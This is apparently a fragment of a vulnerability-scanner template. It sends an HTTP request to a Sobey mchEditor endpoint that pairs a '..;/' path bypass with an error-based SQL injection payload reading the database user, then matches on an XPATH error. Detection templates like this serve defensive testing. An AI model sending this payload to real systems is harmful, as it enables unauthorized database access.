      - |
        GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+extractvalue(1,concat(0x7e,(SELECT+user()))) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Content-Length: 2
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'XPATH syntax error')
